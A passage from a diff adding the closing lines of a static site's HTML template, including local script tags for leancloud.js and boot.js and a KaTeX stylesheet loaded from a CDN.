+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+
+
+
+  
+
+  
+    <!-- KaTeX -->
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0/dist/katex.min.css" />
+  
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
